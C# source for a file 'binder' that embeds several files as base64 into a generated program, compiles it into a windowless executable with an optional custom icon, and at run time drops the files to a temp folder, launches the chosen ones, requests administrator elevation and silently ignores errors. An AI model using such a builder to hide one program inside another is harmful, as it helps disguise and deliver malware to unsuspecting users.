using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;



// tüm hepsinin byteını alıp öyle yapıyor, out of memorye sebep verebilir, bufferlar halinde oku ve yaz


namespace BekoS.IO.FileBinding;

public class Binder
{
    public List<BinderFile> Files { get; } = new List<BinderFile>();


    #region Add File

    public void AddFile(string path, bool isExecutable, bool isAdministrator)
    {
        var fileInfo = new FileInfo(path);

        if (!fileInfo.Exists) throw new FileNotFoundException();

        var fileData = File.ReadAllBytes(path);

        var BinderFile = new BinderFile(fileInfo.Name, fileData)
        {
            IsExecutable = isExecutable,
            IsAdministrator = isAdministrator
        };

        Files.Add(BinderFile);
    }
    public void AddFile(string path) => AddFile(path, false, false);
    public void AddFile(string path, bool isExecutable) => AddFile(path, isExecutable, false);


    #endregion

    #region Compile

    public CompilerResults Compile(string outputFile, string? iconPath)
    {
        if (Files.Count <= 1)
            throw new FileNotFoundException("At least 2 files must be binded!");

        if (Files.All(f => !f.IsExecutable))
            throw new FileNotFoundException("At 1 file must be executed!");

        ArgumentNullException.ThrowIfNull(outputFile);

        if (string.IsNullOrEmpty(outputFile) || outputFile.EndsWith(@"\"))
            throw new ArgumentException("Invalid file name!", nameof(outputFile));

        string name = new FileInfo(outputFile).Name;

        string bindedFileNames = string.Join("|", Files.Select(f => f.Name));
        string bindedFileDatas = string.Join("|", Files.Select(f => Convert.ToBase64String(f.Data)));
        string bindedFileExecutables = string.Join("|", Files.Select(f => f.IsExecutable.ToString()));
        string bindedFileAdministrators = string.Join("|", Files.Select(f => f.IsAdministrator.ToString()));

        string code = @"

                using System;
                using System.IO;
                using System.Diagnostics;
                using System.Collections.Generic;
                using System.Security.Principal;


                public class Program
                {
                    public static void Main() 
                    {
                        " + (Files.Any(f => f.IsAdministrator)
                        ? @"

                        WindowsIdentity identity = WindowsIdentity.GetCurrent();
                        WindowsPrincipal principal = new WindowsPrincipal(identity);

                        if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
                        {
                            var exeName = Process.GetCurrentProcess().MainModule.FileName;
                            ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
                            startInfo.Verb = ""runas"";
                            Process.Start(startInfo);
                            Environment.Exit(0);
                            return;
                        }

                        "
                        : "") + 
                        @"

                        string directory = System.IO.Path.GetTempPath() + @""" + @"\" + name[..name.LastIndexOf(".")] + @" Binds\" + @""";

                        try
                        {
                            if (System.IO.Directory.Exists(directory)) System.IO.Directory.Delete(directory, true);
                            System.IO.Directory.CreateDirectory(directory);
                        }
                        catch { }

                        string[] bindedFileNames = """ + bindedFileNames + @""".Split('|');
                        string[] bindedFileDatas = """ + bindedFileDatas + @""".Split('|');
                        string[] bindedFileExecutions = """ + bindedFileExecutables + @""".Split('|');
                        string[] bindedFileAdministrators = """ + bindedFileAdministrators + @""".Split('|');

                        List<object[]> executables = new List<object[]>();
                        for (int i = 0; i < " + Files.Count + @"; i++)
                        {
                            string name = bindedFileNames[i];
                            if (name.Substring(0, name.IndexOf(""."")) == ""Binded File"")
                            {
                                name = ""Binded File "" + (i + 1) + new FileInfo(name).Extension;
                            }

                            System.IO.File.WriteAllBytes(directory + name, Convert.FromBase64String(bindedFileDatas[i]));

                            bool isExecutable = bool.Parse(bindedFileExecutions[i]);
                            bool isAdministrator = bool.Parse(bindedFileAdministrators[i]);

                            if (isExecutable) executables.Add(new object[] { directory + name, isAdministrator });
                        }

                        foreach (object[] executable in executables)
                        {
                            string path = (string)executable[0];
                            bool isAdministrator = (bool)executable[1];
                        
                            try 
                            {
                                if (!isAdministrator) Process.Start(path);
                                else 
                                {
                                    Process proc = new Process();
                                    proc.StartInfo.FileName = path;
                                    proc.StartInfo.UseShellExecute = true;
                                    proc.StartInfo.Verb = ""runas"";
                                    proc.Start();
                                }
                            } 
                            catch { }
                        }
                    }
                }          
                
            ";

        string[] dllReferences = { "System.dll", "System.IO.dll","System.IO.compression.dll",
                "System.IO.compression.dll", "System.IO.compression.filesystem.dll", "System.Security.dll", "mscorlib.dll" };

        var parameters = new CompilerParameters(dllReferences, outputFile)
        {
            GenerateExecutable = true,
            OutputAssembly = outputFile,
            GenerateInMemory = false,
            TreatWarningsAsErrors = false
        };

        parameters.CompilerOptions += "/t:winexe /unsafe /platform:x86";

        if (iconPath is not null && new FileInfo(iconPath).Extension == ".ico")
            parameters.CompilerOptions += " /win32icon:\"" + iconPath + "\"";

        if (File.Exists(outputFile)) File.Delete(outputFile);

        CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
        CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

        return results;
    }
    public CompilerResults Compile(string outputPath) => Compile(outputPath, null);

    #endregion
}

public class BinderFile
{
    public string Name { get; }
    public bool IsExecutable { get; set; }
    public bool IsAdministrator { get; set; }

    [Browsable(false)]
    public byte[] Data { get; }

    public BinderFile(string name, byte[] data) => (Name, Data) = (name, data);
}
